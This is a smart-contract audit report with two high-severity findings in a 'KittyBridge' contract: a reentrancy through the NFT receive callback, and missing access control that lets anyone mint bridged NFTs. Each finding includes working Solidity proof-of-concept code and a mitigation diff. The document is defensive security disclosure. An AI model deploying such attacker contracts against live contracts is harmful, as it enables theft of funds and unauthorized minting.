### [H-1] Reentrancy in `KittyBridge::bridgeNftWithData` (Reentrancy), this will lead to unauthorized minting of NFTs.

**Description:** The `KittyBridge::bridgeNftWithData` function is vulnerable to reentrancy attack.
The attacker can call the `KittyBridge::bridgeNftWithData` with crafted data and in the callback function `onERC721Received` , they can call the `KittyBridge::bridgeNftWithData` again, which will lead to unauthorized minting of NFTs. The only limitation is that the KittyBridge should have enough link token and the transaction should always go through.

**Impact:**
This will lead to unauthorized minting of NFTs, which will lead to loss of funds for the owner of the contract.

**Proof of Concept:**

<details>

<summary>POC:</summary>

Attacker Contract:

```solidity
contract AttackerContract is IERC721Receiver {
    struct CatInfo {
        string catName;
        string breed;
        string image;
        uint256 dob;
        address[] prevOwner;
        address shopPartner;
        uint256 idx;
    }

    IKittyBridge public kittyBridge;
    HelperConfig.NetworkConfig public networkConfig;

    constructor(
        address _kittyBridge,
        HelperConfig.NetworkConfig memory _networkConfig
    ) {
        kittyBridge = IKittyBridge(_kittyBridge);
        networkConfig = _networkConfig;
    }

    function attack() public {
        string
            memory catImageIpfsHash = "ipfs://QmbxwGgBGrNdXPm84kqYskmcMT3jrzBN8LzQjixvkz4c62";

        CatInfo memory catInfo = CatInfo(
            "meowdy",
            "hehe",
            catImageIpfsHash,
            block.timestamp,
            new address[](0),
            address(0),
            1
        );

        bytes memory _data = abi.encode(
            address(this),
            catInfo.catName,
            catInfo.breed,
            catInfo.image,
            catInfo.dob,
            catInfo.shopPartner
        );

        while (
            IERC20(networkConfig.link).balanceOf(address(kittyBridge)) != 0
        ) {
            kittyBridge.bridgeNftWithData(
                networkConfig.otherChainSelector,
                address(this),
                _data
            );
        }
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external override returns (bytes4) {
        attack();

        return this.onERC721Received.selector;
    }
}
```

Test Case:

```solidity
 function testReentrancy() public {
    AttackerContract attackerContract = new AttackerContract(
        address(kittyBridge),
        networkConfig
    );

    attackerContract.attack();
}
```

</details>

**Recommended Mitigation:**
To prevent reentrancy, the contract should use the reentrancy guard modifier from OpenZeppelin in the `bridgeNftWithData` function.

```diff
+ import {ReentrancyGuard} from "@openzeppelin/contracts/security/ReentrancyGuard.sol";

function bridgeNftWithData(
    uint64 _destinationChainSelector,
    address _receiver,
    bytes memory _data
)
external
+   nonReentrant
onlyAllowlistedDestinationChain(_destinationChainSelector)
validateReceiver(_receiver)
returns (bytes32 messageId)
{
...
}
```

### [H-2] No access control in `KittyBridge::bridgeNftWithData` (Lack of Access Control), this will lead to unauthorized minting of NFTs.

**Description:** No access control is implemented in `KittyBridge::bridgeNftWithData` function, which allows anyone to mint NFTs even if they are not the owner of the NFT. so they can mint a lot of NFTs for free. All they need t o do is to pack the `data`` in the correct format and call the function, and they will get the NFTs minted.

**Impact:**
This will lead to unauthorized minting of NFTs, which will lead to loss of funds for the owner of the contract.

**Proof of Concept:**

<details>

<summary>POC:</summary>

```solidity
 function testUnlimitedNFT_mint() public {
    address attacker = makeAddr("attacker");
    string
        memory catImageIpfsHash = "ipfs://QmbxwGgBGrNdXPm84kqYskmcMT3jrzBN8LzQjixvkz4c62";

    CatInfo memory catInfo = CatInfo(
        "meowdy",
        "hehe",
        catImageIpfsHash,
        block.timestamp,
        new address[](0),
        address(0),
        1
    );

    bytes memory data = abi.encode(
        attacker,
        catInfo.catName,
        catInfo.breed,
        catInfo.image,
        catInfo.dob,
        catInfo.shopPartner
    );

    vm.prank(attacker);

    kittyBridge.bridgeNftWithData(
        networkConfig.otherChainSelector,
        attacker,
        data
    );
}

```

</details>

**Recommended Mitigation:**
Add access control to the `bridgeNftWithData` function to prevent unauthorized minting of NFTs. Such that only the KittyConnect contract can call the function.

```diff
function bridgeNftWithData(
    uint64 _destinationChainSelector,
    address _receiver,
    bytes memory _data
    )
    external
    onlyAllowlistedDestinationChain(_destinationChainSelector)
    validateReceiver(_receiver)
    returns (bytes32 messageId)
{
+       require(msg.sender == kittyConnect, "KittyBridge__NotKittyConnect");
...
}
```
